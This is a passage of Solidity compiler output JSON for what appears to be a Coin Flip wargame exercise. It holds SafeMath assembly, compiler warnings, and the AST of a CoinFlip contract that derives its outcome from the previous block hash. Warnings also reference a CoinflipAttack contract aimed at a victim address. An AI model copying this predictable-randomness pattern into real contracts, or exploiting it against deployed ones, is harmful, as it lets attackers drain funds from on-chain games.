								"div(uint256,uint256,string memory)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mod(uint256,uint256,string memory)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite",
								"sub(uint256,uint256,string memory)": "infinite",
								"tryAdd(uint256,uint256)": "infinite",
								"tryDiv(uint256,uint256)": "infinite",
								"tryMod(uint256,uint256)": "infinite",
								"tryMul(uint256,uint256)": "infinite",
								"trySub(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH #[$]",
									"source": 2,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH [$]",
									"source": 2,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "B"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "CODECOPY",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "BYTE",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "73"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "1"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "MSTORE",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "4"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "MSTORE",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "24"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "tag",
									"source": 2,
									"value": "1"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "ADDRESS",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "MSTORE",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "PUSH",
									"source": 2,
									"value": "73"
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "MSTORE8",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6782,
									"name": "RETURN",
									"source": 2
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212200ba17f4a8c95a74ad4aef4b264ddaf3c5e5eda2da397ebfd974afa00becacd6464736f6c634300080f0033",
									".code": [
										{
											"begin": 482,
											"end": 6782,
											"name": "PUSHDEPLOYADDRESS",
											"source": 2
										},
										{
											"begin": 482,
											"end": 6782,
											"name": "ADDRESS",
											"source": 2
										},
										{
											"begin": 482,
											"end": 6782,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 482,
											"end": 6782,
											"name": "PUSH",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 482,
											"end": 6782,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 482,
											"end": 6782,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 482,
											"end": 6782,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 482,
											"end": 6782,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 482,
											"end": 6782,
											"name": "REVERT",
											"source": 2
										}
									]
								}
							},
							"sourceList": [
								"contracts/Coinflip.sol",
								"contracts/CoinflipAttack.sol",
								"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.15+commit.e14f2714\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations. NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler now has built in overflow checking.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":{\"keccak256\":\"0x0f633a0223d9a1dcccfcf38a64c9de0874dfcbfac0c6941ccf074d63a2ce0e1e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://864a40efcffdf408044c332a5aa38ec5618ed7b4eecb8f65faf45671bd6cdc65\",\"dweb:/ipfs/QmQJquTMtc6fgm5JQzGdsGpA2fqBe3MHWEdt2qzaLySMdN\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n--> contracts/CoinflipAttack.sol\n\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "contracts/CoinflipAttack.sol",
					"start": -1
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "2462",
				"formattedMessage": "Warning: Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.\n  --> contracts/Coinflip.sol:13:3:\n   |\n13 |   constructor() public {\n   |   ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.",
				"severity": "warning",
				"sourceLocation": {
					"end": 440,
					"file": "contracts/Coinflip.sol",
					"start": 387
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "2462",
				"formattedMessage": "Warning: Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.\n  --> contracts/CoinflipAttack.sol:11:3:\n   |\n11 |   constructor(address _victimContractAddress) public {\n   |   ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.",
				"severity": "warning",
				"sourceLocation": {
					"end": 447,
					"file": "contracts/CoinflipAttack.sol",
					"start": 334
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "6321",
				"formattedMessage": "Warning: Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.\n  --> contracts/CoinflipAttack.sol:15:35:\n   |\n15 |   function flip() public returns (bool) {\n   |                                   ^^^^\n\n",
				"message": "Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.",
				"severity": "warning",
				"sourceLocation": {
					"end": 489,
					"file": "contracts/CoinflipAttack.sol",
					"start": 485
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/Coinflip.sol": {
				"ast": {
					"absolutePath": "contracts/Coinflip.sol",
					"exportedSymbols": {
						"CoinFlip": [
							87
						],
						"SafeMath": [
							464
						]
					},
					"id": 88,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol",
							"file": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol",
							"id": 2,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 88,
							"sourceUnit": 465,
							"src": "60:110:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "CoinFlip",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 87,
							"linearizedBaseContracts": [
								87
							],
							"name": "CoinFlip",
							"nameLocation": "183:8:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"global": false,
									"id": 5,
									"libraryName": {
										"id": 3,
										"name": "SafeMath",
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 464,
										"src": "205:8:0"
									},
									"nodeType": "UsingForDirective",
									"src": "199:27:0",
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "218:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"functionSelector": "e6f334d7",
									"id": 7,
									"mutability": "mutable",
									"name": "consecutiveWins",
									"nameLocation": "245:15:0",
									"nodeType": "VariableDeclaration",
									"scope": 87,
									"src": "230:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "230:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 9,
									"mutability": "mutable",
									"name": "lastHash",
									"nameLocation": "273:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 87,
									"src": "265:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 8,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "265:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 12,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "294:6:0",
									"nodeType": "VariableDeclaration",
									"scope": 87,
									"src": "286:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 10,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "286:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 11,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "303:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 19,
										"nodeType": "Block",
										"src": "408:32:0",
										"statements": [
											{
												"expression": {
													"id": 17,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 15,
														"name": "consecutiveWins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 7,
														"src": "415:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "30",
														"id": 16,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "433:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "415:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 18,
												"nodeType": "ExpressionStatement",
												"src": "415:19:0"
											}
										]
									},
									"id": 20,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "398:2:0"
									},
									"returnParameters": {
										"id": 14,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "408:0:0"
									},
									"scope": 87,
									"src": "387:53:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 85,
										"nodeType": "Block",
										"src": "495:404:0",
										"statements": [
											{
												"assignments": [
													28
												],
												"declarations": [
													{
														"constant": false,
														"id": 28,
														"mutability": "mutable",
														"name": "blockValue",
														"nameLocation": "510:10:0",
														"nodeType": "VariableDeclaration",
														"scope": 85,
														"src": "502:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 27,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "502:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 39,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"hexValue": "31",
																			"id": 35,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "558:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			}
																		],
																		"expression": {
																			"expression": {
																				"id": 32,
																				"name": "block",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 4294967292,
																				"src": "541:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_block",
																					"typeString": "block"
																				}
																			},
																			"id": 33,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "number",
																			"nodeType": "MemberAccess",
																			"src": "541:12:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 34,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 343,
																		"src": "541:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 36,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "541:19:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 31,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "531:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 37,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "531:30:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 30,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "523:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 29,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "523:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 38,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "523:39:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "502:60:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 42,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 40,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 9,
														"src": "575:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 41,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 28,
														"src": "587:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "575:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 47,
												"nodeType": "IfStatement",
												"src": "571:53:0",
												"trueBody": {
													"id": 46,
													"nodeType": "Block",
													"src": "599:25:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 43,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "608:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 44,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "608:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 45,
															"nodeType": "ExpressionStatement",
															"src": "608:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 50,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 48,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 9,
														"src": "632:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 49,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 28,
														"src": "643:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "632:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 51,
												"nodeType": "ExpressionStatement",
												"src": "632:21:0"
											},
											{
												"assignments": [
													53
												],
												"declarations": [
													{
														"constant": false,
														"id": 53,
														"mutability": "mutable",
														"name": "coinFlip",
														"nameLocation": "668:8:0",
														"nodeType": "VariableDeclaration",
														"scope": 85,
														"src": "660:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 52,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "660:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 58,
												"initialValue": {
													"arguments": [
														{
															"id": 56,
															"name": "FACTOR",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 12,
															"src": "694:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"id": 54,
															"name": "blockValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 28,
															"src": "679:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 55,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "div",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 373,
														"src": "679:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 57,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "679:22:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "660:41:0"
											},
											{
												"assignments": [
													60
												],
												"declarations": [
													{
														"constant": false,
														"id": 60,
														"mutability": "mutable",
														"name": "side",
														"nameLocation": "713:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 85,
														"src": "708:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 59,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "708:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 67,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 63,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 61,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 53,
															"src": "720:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 62,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "732:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "720:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 65,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "743:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 66,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "720:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 64,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "736:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "708:40:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 70,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 68,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 60,
														"src": "761:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 69,
														"name": "_guess",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 22,
														"src": "769:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "761:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 83,
													"nodeType": "Block",
													"src": "837:57:0",
													"statements": [
														{
															"expression": {
																"id": 79,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 77,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "846:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"hexValue": "30",
																	"id": 78,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "864:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "846:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 80,
															"nodeType": "ExpressionStatement",
															"src": "846:19:0"
														},
														{
															"expression": {
																"hexValue": "66616c7365",
																"id": 81,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "881:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"functionReturnParameters": 26,
															"id": 82,
															"nodeType": "Return",
															"src": "874:12:0"
														}
													]
												},
												"id": 84,
												"nodeType": "IfStatement",
												"src": "757:137:0",
												"trueBody": {
													"id": 76,
													"nodeType": "Block",
													"src": "777:54:0",
													"statements": [
														{
															"expression": {
																"id": 72,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "786:17:0",
																"subExpression": {
																	"id": 71,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "786:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 73,
															"nodeType": "ExpressionStatement",
															"src": "786:17:0"
														},
														{
															"expression": {
																"hexValue": "74727565",
																"id": 74,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "819:4:0",
																"typeDescriptions": {
